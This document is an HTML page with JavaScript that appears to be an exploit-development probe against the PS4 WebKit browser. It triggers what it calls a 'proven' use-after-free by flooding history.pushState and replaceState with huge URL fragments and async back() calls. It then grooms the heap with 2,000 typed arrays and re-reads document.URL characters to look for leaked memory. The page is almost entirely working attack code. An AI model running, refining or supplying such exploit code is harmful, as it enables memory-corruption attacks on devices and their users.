<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – Fragment → TypedArray Slot Probe</title>
<style>
body { font-family: monospace; background:#000; color:#0f0; padding:20px; }
button { font-size:16px; padding:10px; margin:5px; }
#log { white-space:pre-wrap; border:1px solid #0f0; padding:10px; margin-top:10px; max-height:70vh; overflow:auto; }
</style>
</head>

<body>
<h2>PS4 WebKit – UAF ⇄ TypedArray Intersection Test</h2>

<button onclick="runTest()">RUN TEST</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m){ logEl.textContent += m + "\n"; }
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

// =================================================
// CONFIG (do not change)
// =================================================
const BASE = 977;
const STEP = 14461;
const ITERS = 48;

// =================================================
// CORE TEST
// =================================================
async function runTest(){
  logEl.textContent = "";
  log("=== TEST START ===");

  let size = BASE;

  // -------------------------------
  // Phase 1 – Proven UAF Trigger
  // -------------------------------
  log("=== UAF TRIGGER START ===");
  for(let i=0;i<ITERS;i++){
    let frag = "A".repeat(size);
    history.pushState({}, "", "#"+frag);
    history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));

    if(i % 6 === 0){
      setTimeout(()=>history.back(),0);
      log(`[ITER ${i}] back() async`);
    }

    size += STEP;
    await sleep(5);
  }

  log(">>> UAF WINDOW <<<");
  await sleep(120);

  // -------------------------------
  // Baseline snapshot
  // -------------------------------
  const url = document.URL;
  log("[BASE] URL.length = " + url.length);

  const offsets = [64,128,256,512,1024];
  for(const o of offsets){
    log(`[BASE] charCodeAt(${o}) = ${url.charCodeAt(o)}`);
  }

  // -------------------------------
  // Phase 2 – Force fragment collapse
  // -------------------------------
  location.hash = "#B";
  await sleep(10);

  log(">>> FRAGMENT COLLAPSED (hash small) <<<");

  // -------------------------------
  // Phase 3 – Targeted heap grooming
  // -------------------------------
  log(">>> ALLOCATING TYPED ARRAYS <<<");

  let buffers = [];
  let views = [];

  for(let i=0;i<2000;i++){
    let ab = new ArrayBuffer(0x20); // 32 bytes
    let ta = new Uint32Array(ab);
    ta[0] = 0x41414141;
    buffers.push(ab);
    views.push(ta);
  }

  await sleep(20);

  // -------------------------------
  // Phase 4 – Re-read URL backing
  // -------------------------------
  log(">>> POST-GROOM READ <<<");
  log("[AFTER] URL.length = " + document.URL.length);

  for(const o of offsets){
    log(`[AFTER] charCodeAt(${o}) = ${document.URL.charCodeAt(o)}`);
  }

  log("history.length = " + history.length);
  log("=== TEST END ===");
}
</script>
</body>
</html>
